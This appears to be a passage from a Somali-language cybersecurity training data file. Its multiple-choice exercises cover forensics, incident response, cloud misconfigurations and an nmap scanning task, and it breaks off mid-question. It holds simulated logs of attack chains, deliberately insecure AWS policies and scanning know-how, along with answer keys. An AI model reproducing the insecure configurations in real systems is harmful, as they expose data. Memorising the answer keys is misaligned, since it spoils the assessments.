      "Waxaad haysataa disk BitLocker-encrypted ah oo laga soo qaaday shaqaale la eryay. Falanqee xaaladaha kala duwan ee key recovery si aad u helo access.",
    objectives: [
      "Kala saar xaaladaha key recovery ee suurtagalka ah",
      "Sharax faa'iidada memory forensics key recovery ahaan",
      "Fahan legal considerations",
      "Naqshadee investigation plan",
    ],
    artifactTitle: "Case notes (qayb)",
    artifact: `Case notes:
- Disk-ka waa BitLocker-encrypted (TPM + PIN protection)
- Shaqaalaha waa la eryay 3 maalmood ka hor
- Laptop-ka waa la damiyay marka la ururiyay (powered off collection)
- Ma jiro recovery key la helay IT department gudaheeda
- Shaqaalaha email-kiisa corporate wuxuu ku jiraa policy acknowledgment
  oo sheegaya "Company reserves the right to access company devices"
- Memory dump lama qaadan (disk-ka wuu damnaa marka la helay)`,
    questions: [
      {
        id: "q1",
        q: "Marka disk-ka la damiyo (powered off) BitLocker-encrypted ah, khatartu waa?",
        options: [
          "Memory-ga (oo laga yaabo inuu haysto encryption key) waa la lumiyay",
          "Ma jiro khatar, disk-ku weli furan yahay",
          "Encryption-ku si otomaatig ah ayuu u furmaa",
          "Ma jiro saameyn"
        ],
        answer: 0,
        explain: "Powered-off collection wuxuu lumiyaa memory, halka live collection uu ilaalin lahaa keys-ka.",
      },
      {
        id: "q2",
        q: "IT department oo aan haysan recovery key wuxuu tilmaamayaa?",
        options: [
          "Access-ka disk-ka wuxuu noqon karaa mid aad u adag ama aan macquul ahayn",
          "Disk-ka si fudud ayaa loo furi karaa",
          "Ma jiro caqabad",
          "Recovery key-gu marnaba looma baahna BitLocker"
        ],
        answer: 0,
        explain: "Aan recovery key la haysan, access-ku wuxuu ku xiran yahay xalal kale oo adag.",
      },
      {
        id: "q3",
        q: "Policy acknowledgment-ka ('Company reserves the right...') wuxuu bixiyaa?",
        options: [
          "Authorization sharci ah oo kordhinaysa investigation-ka corporate ahaan",
          "Ma jiro faa'iido legal ah",
          "Wuxuu xayiraa investigation-ka",
          "Kaliya loo isticmaalo HR"
        ],
        answer: 0,
        explain: "Policy-ga la ogol yahay shaqaaluhu wuxuu taageeraa authorization-ka corporate.",
      },
      {
        id: "q4",
        q: "Wax laga bartay scenario-gan mustaqbalka ahaan waa?",
        options: [
          "Live acquisition (memory qabashada) waa in la sameeyo marka encrypted disks la shakiyo",
          "Waligeed disk-ka isla markiiba dami",
          "Ma jiro wax la bartay",
          "Kaliya loo isticmaalo law enforcement"
        ],
        answer: 0,
        explain: "Fahamka encryption-ka horay waxay saameysaa go'aanka live vs powered-off collection.",
      },
    ],
    reportPrompt:
      "Qor findings: xaaladda access-ka disk-ka, sababaha memory la lumiyay, authorization legal-ka, iyo talooyin process mustaqbalka ah.",
  },
  {
    slug: "dfir-full-scenario-triage",
    title: "DFIR Full Scenario Triage",
    somali: "Kala Hormarinta Scenario DFIR Dhamaystiran",
    english: "DFIR Full Scenario Triage",
    level: "Sare",
    minutes: 40,
    scenario:
      "Shirkad ayaa hesha alert isku mar ah oo kala duwan: Registry Run key cusub, USB device la xiray, iyo Event Log oo la nadiifiyay. Kala hormari oo isku xir findings-ka.",
    objectives: [
      "Isku xir findings-ka kala duwan (Registry, USB, Event Log)",
      "Dhis timeline isku dartay dhammaan sources-ka",
      "Kala hormari severity-ga findings-ka",
      "Naqshadee investigation plan buuxa",
    ],
    artifactTitle: "Multi-source findings summary",
    artifact: `Finding 1 (Registry): New Run key added 09:14:02
  HKCU\\...\\Run\\SystemUpdate = "C:\\Users\\jdoe\\AppData\\Local\\svc.exe"

Finding 2 (USB): Device connected 09:10:15
  Kingston DataTraveler, Serial 8F2A19C

Finding 3 (Event Log): Event 1102 (log cleared) at 09:22:40

Finding 4 (Prefetch): svc.exe executed 3 times, last run 09:20:11`,
    questions: [
      {
        id: "q1",
        q: "Tartiibka waqtiga ee afarta finding (09:10 → 09:14 → 09:20 → 09:22) wuxuu soo jeedinayaa?",
        options: [
          "USB connect → Run key persistence → execution → log clearing (attack chain)",
          "Dhacdooyin kala madax banaan oo aan xiriir lahayn",
          "Ma jiro pattern la aqoonsan karo",
          "Kaliya coincidence"
        ],
        answer: 0,
        explain: "Tartiibka waqtiga wuxuu soo jeedinayaa isku xigxig loogu talagalay (deliberate sequence).",
      },
      {
        id: "q2",
        q: "'SystemUpdate' Run key-ga magaciisu wuxuu tilmaamayaa?",
        options: [
          "Isku day lagu qariyo persistence-ka magac legit u eg",
          "Update Windows dhab ah",
          "Ma jiro shaki",
          "Antivirus feature"
        ],
        answer: 0,
        explain: "Magacyada generic ama legit-looking waa hab caan ah oo persistence lagu qariyo.",
      },
      {
        id: "q3",
        q: "Event 1102 (log cleared) 09:22:40, kadib execution-ka (09:20:11) wuxuu tilmaamayaa?",
        options: [
          "Attacker-ku wuxuu isku dayay inuu qariyo caddaynta execution-ka dhab ah",
          "Caadi ahaan maintenance",
          "Ma jiro xiriir",
          "Backup process"
        ],
        answer: 0,
        explain: "Log clearing kadib execution waa anti-forensics classic ah.",
      },
      {
        id: "q4",
        q: "Investigation plan-ka xigta, mudnaanta koowaad waa?",
        options: [
          "Falanqee svc.exe (Prefetch/Amcache hash), xaqiiji USB device contents, log recovery",
          "Kaliya sug maalinta xigta",
          "Isla markiiba tirtir Run key-ga",
          "Ma jiro tallaabo la qaadan karo"
        ],
        answer: 0,
        explain: "Multi-pronged approach-ku wuxuu daboolaa dhammaan findings-ka isku xiran.",
      },
    ],
    reportPrompt:
      "Qor warbixin dhamaystiran: timeline isku dartay afarta finding, attack narrative, IOCs, severity rating, iyo investigation plan xiga (portfolio-ready).",
  },
  {
    slug: "s3-bucket-exposure-triage",
    title: "S3 Bucket Exposure Triage",
    somali: "Kala Hormarinta S3 Bucket Exposed ah",
    english: "S3 Bucket Exposure Triage",
    level: "Bilow",
    minutes: 25,
    scenario:
      "Automated scanner-ka shirkaddu wuxuu bixiyay alert ah in S3 bucket uu leeyahay public access. Falanqee configuration-ka oo go'aami saameynta.",
    objectives: [
      "Falanqee bucket policy iyo ACL settings",
      "Aqoonso xogta ku jirta bucket-ka",
      "Kala hormari severity-ga finding-ka",
      "Talo bixi remediation degdeg ah",
    ],
    artifactTitle: "S3 bucket configuration export",
    artifact: `Bucket: customer-invoices-prod
Block Public Access: OFF (all 4 settings disabled)
Bucket Policy:
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::customer-invoices-prod/*"
  }]
}
Object count: 14,822
Sample object names: invoice_2026_client_4471.pdf, invoice_2026_client_8832.pdf
Bucket created: 2025-11-02
Last modified (policy): 2026-03-10`,
    questions: [
      {
        id: "q1",
        q: "Bucket policy-gan, Principal: '*' macnaheedu waa?",
        options: [
          "Qof kasta internet-ka ah ayaa GetObject action u oggol yahay",
          "Kaliya IAM users account-ka gudihiisa",
          "Kaliya AWS support",
          "Ma jiro access la siiyay"
        ],
        answer: 0,
        explain: "Wildcard Principal-ku wuxuu u oggolaadaa qof kasta internet-ka ah access.",
      },
      {
        id: "q2",
        q: "Bucket-ka magaciisu (customer-invoices-prod) marka la eego object names-ka, severity-gu waa?",
        options: [
          "Critical — xog maaliyadeed customers ah oo publicly readable ah",
          "Low — ma jiro xog xasaasi ah",
          "Informational oo keliya",
          "Ma jiro severity"
        ],
        answer: 0,
        explain: "Invoices customers ah waa xog xasaasi ah oo maaliyadeed, PII ku jiri karta."
      },
      {
        id: "q3",
        q: "Policy-ga taariikhdiisu (2026-03-10) marka la barbardhigo bucket creation (2025-11-02) wuxuu tilmaamayaa?",
        options: [
          "Bucket-ku wuxuu ahaa mid private, dabadeed la beddelay public (misconfiguration cusub)",
          "Bucket-ku waligiis wuxuu ahaa public",
          "Ma jiro macluumaad la heli karo",
          "Taariikhdu ma khusayso"
        ],
        answer: 0,
        explain: "Isbeddel dhawaan dhacay wuxuu tilmaamayaa in misconfiguration-ku uu ahaa mid la sameeyay, ma aha default asalka ah.",
      },
      {
        id: "q4",
        q: "Tallaabada ugu degdegsan ee remediation-ka?",
        options: [
          "Shid Block Public Access afarta setting, tirtir bucket policy khaldan, baar CloudTrail waqtiga policy-ga la beddelay",
          "Sug maalinta xigta",
          "Kaliya email la dir owner-ka bucket-ka",
          "Tirtir bucket-ka oo dhan"
        ],
        answer: 0,
        explain: "Containment degdeg ah kadibna investigation-ka sababta la sameeyay isbeddelka.",
      },
    ],
    reportPrompt:
      "Qor finding: severity rating, xogta la khatar galiyay, timeline (creation vs policy change), iyo remediation steps degdeg ah.",
  },
  {
    slug: "iam-policy-privilege-audit",
    title: "IAM Policy Privilege Audit",
    somali: "Kormeerka Awoodda IAM Policy",
    english: "IAM Policy Privilege Audit",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Waxaad samaynaysaa audit IAM policies ah shirkad AWS ah. Falanqee policies-ka la siiyay dhawr users si aad u aqoonsato over-permissioned access.",
    objectives: [
      "Falanqee IAM policy JSON structure",
      "Aqoonso wildcard permissions khatarta ah",
      "Kala hormari findings-ka least privilege ahaan",
      "Talo bixi policy hagaajin ah",
    ],
    artifactTitle: "IAM policy audit export (qayb)",
    artifact: `User: j.mohamed (Marketing Analyst)
Attached Policy: MarketingFullAccess
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

User: a.hassan (Junior Developer)
Attached Policy: DevReadOnly
{
  "Effect": "Allow",
  "Action": ["s3:GetObject", "ec2:Describe*"],
  "Resource": "*"
}

Role: lambda-image-resize (Service Role)
Attached Policy: LambdaExecutionRole
{
  "Effect": "Allow",
  "Action": ["s3:*", "dynamodb:*", "iam:*"],
  "Resource": "*"
}`,
    questions: [
      {
        id: "q1",
        q: "j.mohamed (Marketing Analyst) policy 'Action: *, Resource: *' wuxuu tilmaamayaa?",
        options: [
          "Full admin access — aad uga baxsan baahida shaqada (marketing analyst)",
          "Access habboon shaqada",
          "Ma jiro khatar",
          "Waa read-only access"
        ],
        answer: 0,
        explain: "Marketing analyst uma baahna full admin access — waa khilaaf weyn oo least privilege ah.",
      },
      {
        id: "q2",
        q: "a.hassan (Junior Developer) policy-giisu marka la barbardhigo j.mohamed waa?",
        options: [
          "Mid ka fiican — xaddidan actions specific ah (GetObject, Describe)",
          "Isku mid khatar ah",
          "Ka sii daran",
          "Ma jiro farqi"
        ],
        answer: 0,
        explain: "Read-only actions specific ah waa tusaale wanaagsan oo least privilege ah, in kastoo Resource '*' aanu ahayn kaamil.",
      },
      {
        id: "q3",
        q: "Lambda role 'iam:*' permission-ku wuxuu u oggolaan karaa?",
        options: [
          "Function-ka inuu beddelo IAM policies — privilege escalation risk weyn",
          "Kaliya image resizing (function-ka shaqadiisa)",
          "Ma jiro khatar",
          "Waa waajib Lambda functions oo dhan"
        ],
        answer: 0,
        explain: "iam:* wuxuu u oggolaadaa service role-ka inuu beddelo permissions — aad uga baxsan shaqada image resize.",
      },
      {
        id: "q4",
        q: "Mudnaanta ugu sarreysa remediation ahaan waa?",
        options: [
          "Lambda role-ka (iam:* la saaro) sababtoo ah waa service automated ah oo awood weyn leh oo aan la fiirin",
          "j.mohamed oo keliya",
          "a.hassan oo keliya",
          "Wax kama beddelo"
        ],
        answer: 0,
        explain: "Service roles leh iam:* waa khatar sare — automated exploitation suurtagal ah, human oversight yar.",
      },
    ],
    reportPrompt:
      "Qor audit findings: user/role kasta, permissions khaldan, severity rating, iyo recommended least-privilege policy mid kasta.",
  },
  {
    slug: "security-group-misconfig-hunt",
    title: "Security Group Misconfiguration Hunt",
    somali: "Raadinta Khaladaadka Security Groups",
    english: "Security Group Misconfiguration Hunt",
    level: "Dhexe",
    minutes: 25,
    scenario:
      "Waxaad baarayso security groups shirkad AWS ah oo leh dhawr EC2 instances. Aqoonso rules khatar ah oo internet-ka u furan.",
    objectives: [
      "Falanqee security group inbound rules",
      "Aqoonso ports khatarta ah oo publicly exposed",
      "Kala hormari findings-ka",
      "Talo bixi hagaajin",
    ],
    artifactTitle: "Security group rules export (qayb)",
    artifact: `SG: web-servers-sg
  Inbound: 0.0.0.0/0 -> 80 (HTTP)
  Inbound: 0.0.0.0/0 -> 443 (HTTPS)
  Inbound: 0.0.0.0/0 -> 22 (SSH)

SG: database-sg
  Inbound: 0.0.0.0/0 -> 3306 (MySQL)
  Inbound: 10.0.1.0/24 -> 3306 (MySQL)

SG: internal-admin-sg
  Inbound: 0.0.0.0/0 -> 3389 (RDP)`,
    questions: [
      {
        id: "q1",
        q: "web-servers-sg-ga, ruleka SSH (22) 0.0.0.0/0 ah waa?",
        options: [
          "Misconfiguration — SSH ma aha waajib internet-ka oo dhan loo furo",
          "Caadi, web servers waligood SSH way u baahan yihiin internet-ka oo dhan",
          "Ma jiro khatar",
          "Waa waajib configuration"
        ],
        answer: 0,
        explain: "SSH access-ku waa in la xaddido IP ranges la yaqaan (bastion host, office IP), ma aha internet-ka oo dhan."
      },
      {
        id: "q2",
        q: "database-sg-ga, khilaafka u dhexeeya labada rule (0.0.0.0/0 iyo 10.0.1.0/24) wuxuu tilmaamayaa?",
        options: [
          "Rule 0.0.0.0/0 wuxuu ka dhigayaa rule internal-ka mid aan waxtar lahayn — database-ku waa publicly accessible",
          "Labada rule waa waajib",
          "Ma jiro khilaaf",
          "10.0.1.0/24 ayaa ka adkaanaya 0.0.0.0/0"
        ],
        answer: 0,
        explain: "Marka rule ballaaran (0.0.0.0/0) uu jiro, rule internal-ka ah ma tarto — database-ku weli waa publicly exposed.",
      },
      {
        id: "q3",
        q: "internal-admin-sg-ga RDP (3389) 0.0.0.0/0 ah waa?",
        options: [
          "Critical — RDP internet-ka u furan waa target caan ah oo brute force ah",
          "Low risk",
          "Ma jiro khatar sababtoo ah magaca 'internal' yahay",
          "Waa waajib RDP kasta"
        ],
        answer: 0,
        explain: "Magaca 'internal-admin-sg' ma xaqiijinayo in rule-yadu si sax ah loo xaddiday — 0.0.0.0/0 weli waa khatar.",
      },
      {
        id: "q4",
        q: "Mudnaanta ugu sarreysa remediation ahaan waa?",
        options: [
          "database-sg (3306 public) iyo internal-admin-sg (3389 public) — data/admin access aan xaddidnayn",
          "Kaliya web-servers-sg",
          "Ma jiro mudnaan",
          "Dhammaan waa isku mid"
        ],
        answer: 0,
        explain: "Database iyo admin access-ka aan xaddidnayn waa khatar ka sii daran web ports caadiga ah.",
      },
    ],
    reportPrompt:
      "Qor findings: security groups la baaray, rules khatar ah, severity rating mid kasta, iyo remediation recommendations (IP restriction).",
  },
  {
    slug: "cloudtrail-suspicious-api-analysis",
    title: "CloudTrail Suspicious API Analysis",
    somali: "Falanqaynta CloudTrail API Shaki leh",
    english: "CloudTrail Suspicious API Analysis",
    level: "Sare",
    minutes: 30,
    scenario:
      "SIEM-ku wuxuu muujinayaa CloudTrail events shaki leh oo isku xigxiga ah. Falanqee oo go'aami haddii credential compromise dhacay.",
    objectives: [
      "Falanqee CloudTrail events sequence",
      "Aqoonso privilege escalation attempts",
      "Isku xir events-ka attack chain ah",
      "Talo bixi containment",
    ],
    artifactTitle: "CloudTrail events (qayb, JSON simplified)",
    artifact: `09:14:02 UTC - ConsoleLogin - user: dev-contractor - SourceIP: 41.212.8.19 (unusual geo)
09:15:33 UTC - ListUsers - user: dev-contractor
09:16:02 UTC - CreateAccessKey - user: dev-contractor - target: admin-service-account
09:17:45 UTC - PutUserPolicy - user: dev-contractor - policy: "AdministratorAccess"
09:19:10 UTC - CreateUser - user: dev-contractor - newUser: backup-svc-2
09:20:33 UTC - AttachUserPolicy - target: backup-svc-2 - policy: "AdministratorAccess"
09:25:01 UTC - StopLogging - user: dev-contractor (CloudTrail)`,
    questions: [
      {
        id: "q1",
        q: "ConsoleLogin ka yimid SourceIP aan caadi ahayn (41.212.8.19) wuxuu tilmaamayaa?",
        options: [
          "Credential compromise suurtagal ah — geo-anomaly",
          "Caadi ahaan, contractor-ku wuu safaray",
          "Ma jiro khatar",
          "IP-gu waa internal"
        ],
        answer: 0,
        explain: "Login ka yimid dal aan caadi ahayn waa red flag caan ah oo credential abuse ah."
      },
      {
        id: "q2",
        q: "CreateAccessKey (admin-service-account) kadib login-ka wuxuu tilmaamayaa?",
        options: [
          "Isku day lagu xado credentials service account awood leh",
          "Caadi ahaan maintenance",
          "Backup process",
          "Update software"
        ],
        answer: 0,
        explain: "Abuurista access key admin service account wuxuu bixiyaa attacker access dheeraad ah."
      },
      {
        id: "q3",
        q: "CreateUser + AttachUserPolicy (backup-svc-2, AdministratorAccess) waa?",
        options: [
          "Persistence — attacker uu abuuray account backup ah oo admin ah, si uu ugu sii jiro",
          "Backup process caadi ah",
          "Ma jiro khatar",
          "Waajib DevOps automation"
        ],
        answer: 0,
        explain: "User cusub oo admin ah oo magaca 'backup' u eg waa hab caan ah oo persistence ah.",
      },
      {
        id: "q4",
        q: "StopLogging event-ka ugu dambeeya wuxuu tilmaamayaa?",
        options: [
          "Anti-forensics — attacker isku dayay inuu qariyo dhaqankiisa xiga",
          "Caadi ahaan CloudTrail maintenance",
          "Ma jiro macno",
          "Cost optimization"
        ],
        answer: 0,
        explain: "Joojinta CloudTrail logging kadib abuurista persistence waa isku day lagu qariyo ficillo xiga.",
      },
    ],
    reportPrompt:
      "Qor attack chain: geo-anomaly login → privilege escalation → persistence (user cusub) → anti-forensics (StopLogging). Ku dar containment steps (rotate credentials, xir user cusub, shid logging).",
  },
  {
    slug: "container-image-vulnerability-scan",
    title: "Container Image Vulnerability Scan Review",
    somali: "Dib-u-Eegista Vulnerability Scan Container Image",
    english: "Container Image Vulnerability Scan Review",
    level: "Dhexe",
    minutes: 25,
    scenario:
      "Image scanning tool-ku wuxuu soo saaray findings container image production ah. Falanqee oo kala hormari vulnerabilities-ka.",
    objectives: [
      "Falanqee vulnerability scan output",
      "Kala hormari findings CVSS ahaan",
      "Aqoonso base image issues",
      "Talo bixi remediation",
    ],
    artifactTitle: "Container image scan report (qayb)",
    artifact: `Image: myapp-backend:v2.3.1
Base Image: node:14 (EOL - end of life, no longer receiving security updates)

Findings:
CRITICAL - CVE-2024-XXXX - openssl 1.1.1 - Remote Code Execution - CVSS 9.8
HIGH - CVE-2023-XXXX - lodash 4.17.15 - Prototype Pollution - CVSS 7.5
MEDIUM - CVE-2023-YYYY - express 4.16.0 - Information Disclosure - CVSS 5.3
LOW - Dockerfile: running as root user (no USER directive)`,
    questions: [
      {
        id: "q1",
        q: "Base image node:14 oo EOL ah waa khatar sababtoo ah?",
        options: [
          "Ma helayo security updates mustaqbalka, vulnerabilities cusub ma la xalin doono",
          "Ma jiro khatar, EOL kaliya macnaheedu waa duugoobay",
          "Wuxuu ka dhigayaa image-ka mid ka dhaqso badan",
          "Ma jiro saameyn"
        ],
        answer: 0,
        explain: "EOL images ma helayaan patches — vulnerabilities cusub way sii jiraan waligood.",
      },
      {
        id: "q2",
        q: "CVE-2024-XXXX (CVSS 9.8, RCE, openssl) waa in loo siiyo mudnaan?",
        options: [
          "Ugu sarreysa — RCE + CVSS sare waa combination ugu daran",
          "Ugu hoosaysa",
          "Ma jiro mudnaan gaar ah",
          "Isku mid dhammaan findings"
        ],
        answer: 0,
        explain: "Remote code execution vulnerabilities CVSS sare leh waa in la xaliyo degdeg ahaan."
      },
      {
        id: "q3",
        q: "'Running as root user' (Dockerfile) waa khatar sababtoo ah?",
        options: [
          "Haddii container-ka la jebiyo, attacker-ku wuxuu haystaa awood root ah gudaha container-ka",
          "Ma jiro khatar, root waa caadi containers",
          "Wuxuu ka dhigayaa container-ka mid ka dhaqso badan",
          "Waa waajib containers oo dhan"
        ],
        answer: 0,
        explain: "Root user-ku wuxuu kordhinayaa saameynta haddii container escape dhaco."
      },
      {
        id: "q4",
        q: "Remediation-ka ugu wanaagsan waa?",
        options: [
          "Rebuild image-ka base image cusub (supported), update dependencies vulnerable ah, ku dar USER directive",
          "Kaliya patch openssl gudaha container running-ka jira",
          "Iska dhaaf, findings-ku waa low risk",
          "Kaliya restart container-ka"
        ],
        answer: 0,
        explain: "Containers waa immutable — waa in la dhiso image cusub, ma aha in la patch-gareeyo container running ah.",
      },
    ],
    reportPrompt:
      "Qor findings summary: base image issue, vulnerabilities kala saaran CVSS, Dockerfile misconfiguration, iyo remediation plan (rebuild strategy).",
  },
  {
    slug: "cloud-cost-anomaly-security-investigation",
    title: "Cost Anomaly Security Investigation",
    somali: "Baaritaanka Security-ga Kordhinta Kharashka",
    english: "Cost Anomaly Security Investigation",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Billing alert wuxuu bixiyay digniin ah kharash kordhay 340% habeenkii. Falanqee data-ha si aad u go'aamiso haddii ay tahay cryptomining attack.",
    objectives: [
      "Falanqee billing anomaly data",
      "Isku xir cost spike iyo resource activity",
      "Aqoonso calaamadaha cryptomining",
      "Talo bixi containment",
    ],
    artifactTitle: "Billing & resource activity report (qayb)",
    artifact: `Billing Alert: EC2 spend increased from $340/day to $1,890/day (340% increase)
Time of increase: Started 02:14 UTC last night

New Instances Created (CloudTrail):
02:11 UTC - RunInstances - type: p3.16xlarge (GPU, 8x Tesla V100) x 12 instances
02:11 UTC - Region: ap-southeast-1 (company normally operates us-east-1 only)
02:11 UTC - user: ci-cd-service-account

CI/CD Service Account Recent Activity:
01:58 UTC - Last legitimate deploy action (us-east-1)
02:09 UTC - AssumeRole called from external IP 185.220.101.45
02:11 UTC - RunInstances (the GPU instances above)`,
    questions: [
      {
        id: "q1",
        q: "p3.16xlarge instances (GPU-heavy) 12 jeer la abuuray waxay tilmaamayaan?",
        options: [
          "Cryptomining attack suurtagal ah — GPU instances waa targets caan ah",
          "Development testing caadi ah",
          "Backup process",
          "Ma jiro macno gaar ah"
        ],
        answer: 0,
        explain: "GPU-heavy instances tiro badan oo lama filaan ah waa signature cryptomining ah."
      },
      {
        id: "q2",
        q: "Region-ka (ap-southeast-1) marka la barbardhigo caadiga (us-east-1) wuxuu tilmaamayaa?",
        options: [
          "Attacker-ku wuxuu isku dayay inuu ku qariyo dhaqanka region aan la fiirin joogtada ah",
          "Caadi ahaan expansion business ah",
          "Ma jiro macno",
          "Cost optimization"
        ],
        answer: 0,
        explain: "Region aan caadi ahayn waa habka attacker-yadu ugu qariyaan activity-ga monitoring caadiga ah."
      },
      {
        id: "q3",
        q: "AssumeRole ka yimid external IP (02:09) ka hor RunInstances (02:11) wuxuu tilmaamayaa?",
        options: [
          "CI/CD service account-ka credentials-kiisa waa la xaday oo la isticmaalay",
          "Caadi ahaan deployment process",
          "Ma jiro xiriir",
          "Update system"
        ],
        answer: 0,
        explain: "Isku xigxiga waqtiga wuxuu muujiyaa in credential la xaday loo isticmaalay resource abuse."
      },
      {
        id: "q4",
        q: "Tallaabada ugu degdegsan?",
        options: [
          "Joojinta/tirtirida instances GPU ah, baabi'inta CI/CD service account credentials, rotate gareynta",
          "Sug bill-ka xigga si loo xaqiijiyo",
          "Iska dhaaf, waa false positive suurtagal ah",
          "Kaliya email la dir finance team-ka"
        ],
        answer: 0,
        explain: "Containment degdeg ah wuxuu joojinayaa kharashka sii kordhaya iyo credential abuse-ka.",
      },
    ],
    reportPrompt:
      "Qor findings: attack chain (credential theft → resource abuse), cost impact, IOCs (IP, region, instance types), iyo containment/remediation steps.",
  },
  {
    slug: "cloud-dr-plan-gap-analysis",
    title: "DR Plan Gap Analysis",
    somali: "Falanqaynta Farqiga Qorshaha DR",
    english: "Disaster Recovery Plan Gap Analysis",
    level: "Dhexe",
    minutes: 25,
    scenario:
      "Waxaad dib u eegaysaa backup/DR configuration shirkad ah kadib ransomware incident kale oo industry-ga ka dhacay. Aqoonso gaps-ka.",
    objectives: [
      "Falanqee backup configuration current",
      "Barbardhig RTO/RPO actual vs target",
      "Aqoonso ransomware vulnerability gaps",
      "Talo bixi hagaajin",
    ],
    artifactTitle: "Backup & DR configuration summary",
    artifact: `Current Backup Configuration:
- RDS automated snapshots: Daily, 7-day retention
- S3 versioning: Disabled
- S3 Object Lock (immutability): Not configured
- Cross-region replication: Not configured
- Last DR drill/test: Never performed

Business Requirements:
- Target RTO: 4 hours
- Target RPO: 1 hour
- Compliance requirement: Immutable backups for financial records (industry regulation)`,
    questions: [
      {
        id: "q1",
        q: "RDS daily snapshots marka la barbardhigo target RPO (1 saac) waxay tilmaamayaan?",
        options: [
          "Gap weyn — RPO dhabta ah waa ilaa 24 saac, ka sii daran target-ka",
          "Waa mid ku filan target-ka",
          "Ma jiro gap",
          "Kaliya loo baahan yahay compliance"
        ],
        answer: 0,
        explain: "Daily backups oo keliya waxay dhigan yihiin in la lumin karo ilaa 24 saac oo data ah, ka sii daran 1-hour RPO target-ka."
      },
      {
        id: "q2",
        q: "S3 Object Lock aan la configure gareyn waxay tilmaamaysaa gap?",
        options: [
          "Compliance violation — financial records u baahan immutable backups",
          "Ma jiro gap",
          "Waa optional oo aan muhiim ahayn",
          "Kaliya loo isticmaalo cost saving"
        ],
        answer: 0,
        explain: "Business requirement-ku wuxuu si cad u sheegayay immutability financial records ahaan — gap direct ah."
      },
      {
        id: "q3",
        q: "Cross-region replication la'aanteedu waxay kordhinaysaa?",
        options: [
          "Khatarta region-wide outage/disaster oo joojinaya recovery",
          "Ma jiro saameyn",
          "Kaliya cost-ka",
          "Speed-ka backups"
        ],
        answer: 0,
        explain: "Backups hal region ku jira waa vulnerable disaster region-wide ah."
      },
      {
        id: "q4",
        q: "DR drill aan waligeed la sameyn waxay tilmaamaysaa?",
        options: [
          "Plan-ka lama xaqiijin — laga yaabo inuusan shaqeynayn marka dhab ahaan loo baahdo",
          "Ma jiro gap, plan qoraal ah ayaa ku filan",
          "Waa waajib kaliya sanad kasta mar",
          "Ma jiro faa'iido drills ah"
        ],
        answer: 0,
        explain: "Plan aan la tijaabin waa mid aan la aamini karin — gap ugu weyn ee assessment-ka.",
      },
    ],
    reportPrompt:
      "Qor gap analysis: current vs target RTO/RPO, compliance gaps (immutability), cross-region gap, iyo remediation roadmap oo mudnaan leh.",
  },
  {
    slug: "multi-account-ir-scenario",
    title: "Multi-Account IR Scenario",
    somali: "Scenario IR Accounts Badan",
    english: "Multi-Account Incident Response Scenario",
    level: "Sare",
    minutes: 35,
    scenario:
      "Organization AWS ah oo leh 5 accounts (dev, staging, prod, security, shared-services) ayaa hesha alert ah oo la xiriira cross-account access shaki leh. Falanqee oo naqshadee response.",
    objectives: [
      "Falanqee cross-account trust relationships",
      "Aqoonso lateral movement suurtagal ah",
      "Naqshadee investigation scope accounts oo dhan",
      "Talo bixi centralized containment",
    ],
    artifactTitle: "Cross-account activity summary (qayb)",
    artifact: `Alert: GuardDuty finding in "dev" account
Finding: Unusual AssumeRole pattern detected

CloudTrail Analysis (Organization Trail):
dev account: 10:02 UTC - Compromised dev credentials used (phishing suspected)
dev account: 10:05 UTC - AssumeRole to "shared-services" account (cross-account role: DeployRole)
shared-services account: 10:06 UTC - AssumeRole to "prod" account (cross-account role: ProdAccess)
prod account: 10:08 UTC - S3 ListBuckets, GetObject calls on "customer-data-prod" bucket
prod account: 10:15 UTC - Large data transfer detected (2.3 GB egress)`,
    questions: [
      {
        id: "q1",
        q: "Attack chain-ku (dev → shared-services → prod) wuxuu muujinayaa?",
        options: [
          "Cross-account lateral movement iyada oo la isticmaalayo trust relationships legit ah",
          "Incident go'doonsan hal account ah",
          "Ma jiro xiriir accounts-ka dhexdooda",
          "Caadi ahaan CI/CD deployment"
        ],
        answer: 0,
        explain: "Attacker-ku wuxuu isticmaalay AssumeRole chains legit ah si uu ugu gudbo accounts."
      },
      {
        id: "q2",
        q: "Investigation-ku waa in uu daboolo?",
        options: [
          "Dhammaan shanta accounts, ma aha kaliya dev account-ka alert-ku ka yimid",
          "Kaliya dev account",
          "Kaliya prod account",
          "Kaliya shared-services"
        ],
        answer: 0,
        explain: "Lateral movement-ku wuxuu saameeyay accounts badan — investigation-ku waa in uu ballaadhan yahay."
      },
      {
        id: "q3",
        q: "Data transfer 2.3 GB (10:15 UTC) kadib S3 access wuxuu tilmaamayaa?",
        options: [
          "Data exfiltration suurtagal ah oo xog customers ah",
          "Backup process caadi ah",
          "Update system",
          "Ma jiro macno"
        ],
        answer: 0,
        explain: "Qadar weyn oo data egress ah kadib access unauthorized ah waa red flag exfiltration ah."
      },
      {
        id: "q4",
        q: "Containment-ku waa in uu daboolo?",
        options: [
          "Baabi'inta dev credentials, dib-u-eegista/xannibaadda trust policies (DeployRole, ProdAccess), monitoring prod bucket-ka",
          "Kaliya dev account credentials",
          "Kaliya prod bucket-ka la xiro",
          "Ma jiro tallaabo la qaadan karo dhammaan accounts"
        ],
        answer: 0,
        explain: "Chain-ka oo dhan waa in la xannibaa, ma aha kaliya bilowga (dev credentials).",
      },
    ],
    reportPrompt:
      "Qor full attack chain report: initial access, cross-account lateral movement (trust relationships used), exfiltration estimate, iyo containment plan accounts oo dhan.",
  },
  {
    slug: "nmap-command-practice",
    title: "Nmap: Real Scan Commands",
    somali: "Nmap: Amarada Scan-ka Dhabta ah",
    english: "Nmap: Real Scan Commands",
    level: "Bilow",
    minutes: 30,
    taskType: "command",
    scenario:
      "Waxaad hesha target host `10.10.14.22`. Waxaa laguu siiyay authorization qoraal ah oo test-ka ku ogolaanaya. Isticmaal amarada nmap-ka dhabta ah si aad u hesho macluumaad ku filan.",
    objectives: [
      "Qor amarka service/version detection",
      "Qor amarka skip-ping (host firewall ayaa block-gareeya ICMP)",
      "Qor amarka OS detection",
      "Fasir natiijada scan-ka",
    ],
    artifactTitle: "Authorization scope",
    artifact: `Target: 10.10.14.22
Scope: Full TCP port range authorized
Note: Host firewall drops ICMP (ping) — standard discovery will fail
Client requirement: service versions + OS fingerprint needed for report`,
    questions: [
      {
        id: "q1",
        q: "Maxaa dhici doona haddii aad isticmaasho nmap caadi ah oo aan `-Pn` lahayn?",
        options: [
          "Wax kale ma dhicin",
